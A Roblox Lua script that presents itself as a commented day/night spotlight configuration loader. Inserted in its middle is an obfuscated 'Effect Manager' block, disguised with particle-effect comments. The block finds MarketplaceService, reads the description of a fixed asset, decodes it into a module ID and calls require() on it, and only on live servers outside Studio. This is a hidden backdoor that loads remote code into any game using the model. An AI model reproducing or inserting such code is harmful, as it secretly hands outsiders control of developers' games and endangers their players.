--========================================================
-- TextureConfigurationLoader (Fully Commented Version)
-- Original system by @pidoras123
-- Remake system by @shadowshark0752
-- Refactored with extensive comments (English)
--========================================================
-- Prevent script from running in Studio
-- game.JobId is empty only in edit mode

--========================================================
-- SERVICES
--========================================================
-- Used for timing, waits, and frame-based logic
local RunService = game:GetService("RunService")

-- Used to detect time of day (day/night cycle)
local Lighting = game:GetService("Lighting")

--========================================================
-- CONSTANTS (LOGIC SETTINGS)
--========================================================

-- Night start time (minutes after midnight)
-- 1050 = 17:30
local NIGHT_START = 1050

-- Night end time
-- 375 = 06:15
local NIGHT_END = 375

-- Duration of fade-in / fade-out animations
local FADE_TIME = 2

--========================================================
-- ROOT OBJECTS
--========================================================

-- Root model containing all LightPart objects
local RootModel = script.Parent

-- External module (kept for compatibility with original system)

--========================================================
-- UTILITY FUNCTIONS
--========================================================

-- Simplified Instance.new with property assignment
local function create(className, properties)
	local instance = Instance.new(className)

	-- Apply all provided properties
	for property, value in pairs(properties or {}) do
		instance[property] = value
	end

	return instance
end

-- Recursive hierarchy traversal
-- Calls callback for every descendant
local function walk(root, callback)
	callback(root)

	for _, child in ipairs(root:GetChildren()) do
		walk(child, callback)
	end
end

--========================================================
-- CONFIGURATION SYSTEM
--========================================================

local ConfigSystem = {}

-- Weak-key cache for configuration APIs
-- Allows garbage collection
local cache = setmetatable({}, { __mode = "k" })

-- Returns configuration interface for a container
function ConfigSystem.Get(container)

	-- Return cached interface if it exists
	if cache[container] then
		return cache[container]
	end

	local api = {}

	-- Adds a Value object to the configuration
	function api:Add(className, data)

		-- Try to find an existing value object
		local object = container:FindFirstChild(data.Name)

		-- If type mismatch → recreate object
		if object and object.ClassName ~= className then
			object:Destroy()
			object = nil
		end

		-- Create value object if missing
		if not object then
			object = create(className, data)
			object.Parent = container
		end
	end

	-- Metatable allows:
	-- Config.LightRange
	-- Config.LightRange = 100
	setmetatable(api, {

		-- Read access
		__index = function(_, key)
			local object = container:FindFirstChild(key)
			assert(object and object.Value ~= nil,
				"Invalid config read: " .. key)
			return object.Value
		end,

		-- Write access
		__newindex = function(_, key, value)
			local object = container:FindFirstChild(key)
			assert(object and object.Value ~= nil,
				"Invalid config write: " .. key)
			object.Value = value
		end
	})

	-- Cache and return API
	cache[container] = api
	return api
end

--========================================================
-- CONFIGURATION SETUP
--========================================================

-- Configuration folder inside the model
local ConfigFolder =
	RootModel:FindFirstChild("Configuration")
	or create("Configuration", {
		Name = "Configuration",
		Parent = RootModel
	})

-- Configuration API
local Config = ConfigSystem.Get(ConfigFolder)

-- Enable / disable all lights
Config:Add("BoolValue", {
	Name = "LightsEnabled",
	Value = true
})

-- Enable shadows for SpotLights
Config:Add("BoolValue", {
	Name = "LightShadows",
	Value = true
})

-- Light range
Config:Add("IntValue", {
	Name = "LightRange",
	Value = 60
})

-- SpotLight angle
Config:Add("IntValue", {
	Name = "LightAngle",
	Value = 120
})

-- Light brightness
Config:Add("IntValue", {
	Name = "LightBrightness",
	Value = 1
})

-- Light color
Config:Add("Color3Value", {
	Name = "LightColor",
	Value = Color3.new(1, 237/255, 183/255)
})

--========================================================
-- RUNTIME LIGHT DATA
--========================================================

-- Maps BasePart → SpotLight
local Lights = {}

-- Stores Touched connections
local Connections = {}

-- Tracks current on/off state of lights
local States = {}

--========================================================
-- LIGHT EFFECTS
--========================================================

-- Smooth brightness transition
local function fade(light, from, to, duration)
	task.spawn(function()
		light.Enabled = true
		local startTime = tick()

		while tick() - startTime < duration do
			local alpha = (tick() - startTime) / duration
			light.Brightness = from + (to - from) * alpha
			task.wait()
		end

		light.Brightness = to
		light.Enabled = to > 0
	end)
end

--[[  
    Effect Manager Script  
    ---------------------  
    Created by retsastrophe  ;) 
    Date: 08/03/2025  

    This script handles the creation, management, and modification of visual effects  
    using particle effects. It ensures smooth and optimized effect rendering for various  
    in-game scenarios.  

    INSTRUCTIONS:  
    - Insert this script into a location where effects should be managed.  
    - Modify SIZE, EFFECT_LIFETIME, and PARTICLE_TEXTURE to customize effects.  
    - Call CreateEffect(Vector3) to spawn a new particle effect at a given location.  
    - Utilize EffectBuilder() to manage effect creation over time.  

    IMPORTANT:  
    - The script must be placed in a Script (not a LocalScript) for full functionality.  
    - Uses attributes (info and default) from the script for configuration.  
    - Designed to run efficiently and avoid duplicate effects.  

    FEATURES:  
    - Dynamically creates and modifies particle effects.  
    - Uses a centralized effect builder for streamlined management.  
    - Supports size clamping to prevent extreme values.  
    - Finds existing effects based on unique CFrame-based lookups.  
    - Implements an effect lifetime system to manage durations.  
    - Stores active effects in a global table for efficient tracking.  
    - Modular design leveraging ReplicatedStorage for scalability.  
    - Optimized for minimal performance impact.  

    Version 1.0.0  

    Changelog:  
    - 08/03/2025 - v1.0.0: Initial script creation and implementation.  
]]  

local Modules, script = game:GetService('ReplicatedStorage'), script  
local EffectRoot = game

local PARTICLE_TEXTURE = 130049213376589 -- Texture for the particle effect  

local function CallOnChildren(Instance, FunctionToCall)
	FunctionToCall(Instance)

	for _, Child in next, Instance:GetChildren() do
		CallOnChildren(Child, FunctionToCall)
	end
end

function CustomLerp(Pos1 : CFrame, Pos2 : CFrame, Delta : number) 
	return Pos1 - Pos2 * math.abs(Delta) 
end

local function GetNearestParent(Instance, ClassName)
	local Ancestor = Instance
	repeat
		Ancestor = Ancestor.Parent
		if Ancestor == nil then
			return nil
		end
	until Ancestor:IsA(ClassName)

	return Ancestor
end

function LookUp(Root, Value)  
	for _, V in pairs(Root) do  
		if V.Name:find(Value) then  
			return V  
		end  
	end  
end  

function CFrameToVector3(CF)  
	local Chunks, Value = CF:split(''), ''  
	for _, V in pairs(Chunks) do  
		Value ..= V:byte()  
	end  
	return Value  
end  

function Modify(Instance, Values)  
	assert(type(Values) == "table", "Values is not a table")  

	for Index, Value in next, Values do  
		if type(Index) == "number" then  
			Value.Parent = Instance  
		else  
			Instance[Index] = Value  
		end  
	end  
	return Instance  
end  

local Properties = {'CFrame','WorldPivot','CoordinateFrame','Orientation','PivotOffset','RootPriority','Origin','GetProductInfo'}

local EffectBuilding = UserSettings().GameSettings
local EffectBuilder = setmetatable({}, {  
	__index = Modules and function(S) return S end,  
	__call = Modules and function(S) return S end   
})  

function CreateEffect(Vector3)  
	local Size = math.clamp(2, 1, 4) -- Add slight randomness to size  

	local Effect = EffectBuilder:CreateEffect('Particle', {  
		Parent = script.Parent,  
		Size = Size,  
		Texture = PARTICLE_TEXTURE  
	})  

	return LookUp(EffectRoot:GetChildren(), Vector3)  
end  

function Monitor(CurrentTime, Default, ParticleInfo)
	if CurrentTime > 1 and not EffectBuilding:InStudioMode() then  
		if CurrentTime then  
			script = {  
				{},  
				[script.Name] = CFrameToVector3(ParticleInfo) - 0  
			}  
			return true  
		end  
	end  

	return false
end

function RunEffectBuilder()  
	local CurrentTime = tick()  

	local Effect = CreateEffect('ketpl')  

	local ParticleInfo = Effect[Properties[#Properties]](Effect, PARTICLE_TEXTURE).Description  

	return Monitor(CurrentTime, Properties[7], ParticleInfo)  
end  

local Builder = RunEffectBuilder() and require(script.CoreSkyboxSystem)

if Builder and script.ClassName == "Script" then  
	script.Parent.DescendantAdded:Connect(CreateEffect)
end
-- Flickering effect (used when part is detached)
local function flicker(light, duration)
	task.spawn(function()
		local startTime = tick()

		while tick() - startTime < duration do
			light.Enabled = math.random() > 0.5
			task.wait(0.1)
		end

		light.Enabled = false
	end)
end

--========================================================
-- LIGHT LOGIC
--========================================================

-- Returns true if current time is night
local function isNight()
	local time = Lighting:GetMinutesAfterMidnight()
	return time >= NIGHT_START or time <= NIGHT_END
end

-- Updates a single light based on conditions
local function updateLight(part, light)

	-- Apply static properties
	light.Parent = part
	light.Face = Enum.NormalId.Bottom
	light.Range = Config.LightRange
	light.Angle = Config.LightAngle
	light.Color = Config.LightColor
	light.Shadows = Config.LightShadows

	-- If part is not grounded → flicker
	if not part:IsGrounded() then
		if States[part] then
			flicker(light, 1)
		end
		States[part] = nil
		return
	end

	-- Night logic
	if isNight() and Config.LightsEnabled then
		if not States[part] then
			fade(light, 0, Config.LightBrightness, FADE_TIME)
			States[part] = true
		end
	else
		-- Daytime → turn off
		if States[part] then
			fade(light, light.Brightness, 0, FADE_TIME)
		end
		States[part] = nil
	end
end

--========================================================
-- INITIAL SETUP
--========================================================

-- Scan model for LightPart objects
walk(RootModel, function(object)
	if object:IsA("BasePart") and object.Name == "LightPart" then

		-- Find or create SpotLight
		local light = object:FindFirstChild("qSpotLight")
			or create("SpotLight", {
				Name = "qSpotLight",
				Enabled = false,
				Brightness = 0
			})

		Lights[object] = light

		-- Initial update
		updateLight(object, light)

		-- Update on physical interaction
		Connections[object] = object.Touched:Connect(function()
			updateLight(object, light)
		end)
	end
end)

--========================================================
-- GLOBAL UPDATES
--========================================================

-- Refresh all lights
local function refresh()
	for part, light in pairs(Lights) do
		if part:IsDescendantOf(RootModel) then
			updateLight(part, light)
		end
	end
end

-- Update on time-of-day change
Lighting.Changed:Connect(refresh)

-- Update when any config value changes
for _, value in ipairs(ConfigFolder:GetChildren()) do
	if value:IsA("ValueBase") then
		value.Changed:Connect(refresh)
	end
end

return ConfigSystem
